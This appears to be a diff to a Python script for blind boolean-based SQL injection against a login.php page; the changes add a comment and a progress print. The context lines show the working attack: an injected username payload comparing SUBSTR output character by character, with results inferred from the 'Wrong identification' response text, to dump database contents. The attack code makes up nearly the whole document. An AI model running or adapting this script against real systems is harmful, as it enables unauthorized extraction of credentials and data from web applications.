@@ -3,6 +3,7 @@ def is_correct_char(index, char, base_query, row_offset):
     payload = f"' OR (SELECT SUBSTR(({full_query}), {index}, 1)) = '{char}';-- -"
     try:
         response = session.post(TARGET + "/login.php", data={"username": payload, "password": ""})
+        # True Condition
         return "Wrong identification" in response.text
     except:
         return False
@@ -20,6 +21,7 @@ def dump_data(base_query):
             for char in "abcdefghijklmnopqrstuvwxyz0123456789_@-:":
                 if is_correct_char(i, char, base_query, row_offset):
                     extracted_string += char
+                    print(extracted_string)
                     char_found = True
                     found_row = True
                     break
